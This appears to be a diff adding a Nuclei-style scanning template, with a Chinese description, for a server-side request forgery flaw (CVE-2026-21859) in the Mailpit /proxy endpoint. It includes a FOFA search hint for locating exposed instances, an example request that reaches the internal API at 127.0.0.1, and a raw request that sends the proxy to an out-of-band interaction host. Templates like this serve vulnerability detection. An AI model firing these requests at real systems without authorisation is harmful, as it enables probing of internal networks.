@@ -1,0 +1,26 @@
+id: mailpit-proxy-ssrf
+info:
+  name: "Mailpit 端点服务端请求伪造漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: Mailpit
+          Mailpit是Ralph Slooten开发的电子邮件测试工具。该产品1.28.0及之前版本的/proxy接口未正确验证用户输入的URL参数，导致服务端请求伪造漏洞。攻击者可通过构造恶意请求参数，诱使服务器向内部网络发起未经授权的HTTP请求。
+          GET /proxy?url=http://127.0.0.1:8025/api/v1/info HTTP/1.1
+  reference:
+  - CVE-2026-21859
+  tags: Mailpit
+http:
+- raw:
+  - |
+    GET /proxy?url=http://{{interactsh-url}} HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 400
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
